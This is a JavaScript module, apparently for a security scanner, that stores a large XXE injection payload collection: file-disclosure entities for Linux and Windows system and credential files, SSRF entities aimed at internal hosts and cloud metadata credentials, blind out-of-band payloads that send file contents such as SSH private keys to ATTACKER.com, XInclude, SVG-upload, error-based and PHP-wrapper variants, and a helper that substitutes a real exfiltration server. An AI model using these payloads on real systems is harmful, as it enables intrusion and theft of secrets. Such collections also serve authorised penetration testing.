// XXE (XML External Entity) Payloads
// Comprehensive payload database for XXE injection attacks

const XXEPayloads = {
    // Classic XXE - File Disclosure
    fileDisclosure: {
        linux: [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]>'
        ],

        windows: [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System.ini">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/Panther/Unattend.xml">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/Desktop/passwords.txt">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Program Files/MySQL/my.ini">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/xampp/htdocs/config.php">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/debug/NetSetup.log">]>'
        ]
    },

    // SSRF via XXE
    ssrf: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/admin">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/api/users">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1/config">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/manager/html">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:5984/_all_dbs">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:25/xHELO%20localhost">]>'
    ],

    // Blind XXE - Out-of-Band
    blindOOB: [
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd"> %xxe;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd"> %dtd;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/hostname"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://ATTACKER.com/?x=%data;\'>"> %param1;]>',
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://ATTACKER.com/xxe.dtd">%remote;%int;%trick;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd">%dtd;]>',
        '<!DOCTYPE foo [<!ENTITY % payload SYSTEM "file:///etc/passwd"><!ENTITY % wrapper "<!ENTITY send SYSTEM \'http://ATTACKER.com/?%payload;\'>"> %wrapper;]>',
        '<!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd">%dtd;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///c:/windows/win.ini"><!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://ATTACKER.com/?%data;\'>">%param1;]>',
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://ATTACKER.com/xxe.xml">%remote;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://ATTACKER.com/?x=%file;\'>">%eval;%exfiltrate;]>'
    ],

    // Parameter Entity Injection
    parameterEntity: [
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY callhome SYSTEM "http://ATTACKER.com/?%xxe;">]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % start "<!ENTITY &#x25; send SYSTEM \'http://ATTACKER.com/?%file;\'>">%start;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///c:/boot.ini"><!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM \'http://ATTACKER.com/?%data;\'>">%param;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd">%dtd;%all;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">%file;]>',
        '<!DOCTYPE foo [<!ENTITY % payload SYSTEM "file:///etc/issue"><!ENTITY % wrapper "<!ENTITY send SYSTEM \'ftp://ATTACKER.com/%payload;\'>">%wrapper;]>',
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://ATTACKER.com/xxe.dtd">%remote;%init;%trick;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///var/www/html/config.php"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///home/user/.ssh/id_rsa"><!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://ATTACKER.com/?key=%data;\'>">%param1;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % start "<!ENTITY &#x25; file SYSTEM \'file:///etc/passwd\'>">%start;%file;]>'
    ],

    // Error-based XXE
    errorBased: [
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/hostname"><!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%data;\'>">%param;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % payload SYSTEM "file:///etc/issue"><!ENTITY % wrapper "<!ENTITY &#x25; error SYSTEM \'file:///doesnotexist/%payload;\'>">%wrapper;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % param "<!ENTITY &#x25; error SYSTEM \'file:///invalid/%data;\'>">%param;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///nonexistent/%file;\'>">%eval;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///var/log/apache2/access.log"><!ENTITY % param "<!ENTITY &#x25; error SYSTEM \'file:///invalid/%data;\'>">%param;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///root/.bash_history"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/shadow"><!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%data;\'>">%param;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///home/user/.ssh/authorized_keys"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>'
    ],

    // XInclude Attacks
    xinclude: [
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://internal.server/admin"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///proc/self/environ"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/config.php"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="php://filter/convert.base64-encode/resource=/etc/passwd"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/user/.ssh/id_rsa"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/boot.ini"/></foo>'
    ],

    // SVG Upload XXE
    svg: [
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://internal.server/admin">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>'
    ],

    // DOCTYPE Variations
    doctype: [
        '<!DOCTYPE foo SYSTEM "http://ATTACKER.com/evil.dtd">',
        '<!DOCTYPE foo PUBLIC "-//B//DTD B//EN" "http://ATTACKER.com/evil.dtd">',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ATTLIST foo attr CDATA "file:///etc/passwd">]>',
        '<!DOCTYPE foo SYSTEM "file:///etc/passwd">',
        '<!DOCTYPE foo [<!NOTATION notation SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd">%xxe;<!ELEMENT foo ANY>]>',
        '<!DOCTYPE foo PUBLIC "any_public_id" "http://ATTACKER.com/evil.dtd">',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+">]>'
    ],

    // PHP Wrappers
    phpWrappers: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/environ">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/user/.ssh/id_rsa">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/log/apache2/access.log">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/root/.bash_history">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/mysql/my.cnf">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf">]>'
    ]
};

// Target files for extraction
const TargetFiles = {
    linux: [
        '/etc/passwd',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/issue',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/var/www/html/config.php',
        '/home/user/.ssh/id_rsa',
        '/var/log/apache2/access.log',
        '/root/.bash_history'
    ],

    windows: [
        'C:/Windows/win.ini',
        'C:/Windows/System32/drivers/etc/hosts',
        'C:/boot.ini',
        'C:/Windows/System.ini',
        'C:/inetpub/wwwroot/web.config',
        'C:/Windows/Panther/Unattend.xml',
        'C:/Program Files/MySQL/my.ini',
        'C:/xampp/htdocs/config.php',
        'C:/Windows/debug/NetSetup.log',
        'C:/Users/Administrator/Desktop/passwords.txt'
    ]
};

// Helper functions
function getPayloadsByType(type) {
    if (type === 'fileDisclosure') {
        return [...XXEPayloads.fileDisclosure.linux, ...XXEPayloads.fileDisclosure.windows];
    }
    return XXEPayloads[type] || [];
}

function getAllXXEPayloads() {
    const allPayloads = [];

    // File disclosure
    allPayloads.push(...XXEPayloads.fileDisclosure.linux);
    allPayloads.push(...XXEPayloads.fileDisclosure.windows);

    // Other types
    Object.keys(XXEPayloads).forEach(key => {
        if (key !== 'fileDisclosure' && Array.isArray(XXEPayloads[key])) {
            allPayloads.push(...XXEPayloads[key]);
        }
    });

    return allPayloads;
}

function getPayloadCount() {
    return getAllXXEPayloads().length;
}

function injectPayloadIntoXML(xmlTemplate, payload, oobServer = '') {
    // Replace ATTACKER.com with actual OOB server
    if (oobServer) {
        payload = payload.replace(/ATTACKER\.com/g, oobServer);
    }

    // Inject payload into XML template
    if (xmlTemplate.includes('<?xml')) {
        // Insert after XML declaration
        return xmlTemplate.replace('<?xml version="1.0" encoding="UTF-8"?>',
            '<?xml version="1.0" encoding="UTF-8"?>\n' + payload);
    } else {
        // Prepend to XML
        return payload + '\n' + xmlTemplate;
    }
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        XXEPayloads,
        TargetFiles,
        getPayloadsByType,
        getAllXXEPayloads,
        getPayloadCount,
        injectPayloadIntoXML
    };
}
